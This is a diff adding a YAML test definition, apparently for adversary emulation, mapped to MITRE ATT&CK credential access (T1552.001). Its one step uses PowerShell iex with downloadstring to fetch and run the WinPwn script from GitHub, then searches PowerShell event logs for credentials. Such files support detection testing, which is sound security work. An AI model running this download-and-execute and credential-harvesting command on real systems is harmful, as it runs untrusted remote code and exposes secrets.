@@ -1,0 +1,24 @@
+api_version: "2.0"
+name: WinPwn - powershellsensitive
+description: Check Powershell event logs for credentials or other sensitive information via winpwn powershellsensitive function.
+uuid: 75f66e03-37d3-4704-9520-3210efbe33ce
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1552: Unsecured Credentials'
+    subtechniques:
+        - 'T1552.001: Credentials In Files'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: winpwn---powershellsensitive
+      inline: |-
+        $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+        powershellsensitive -consoleoutput -noninteractive
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
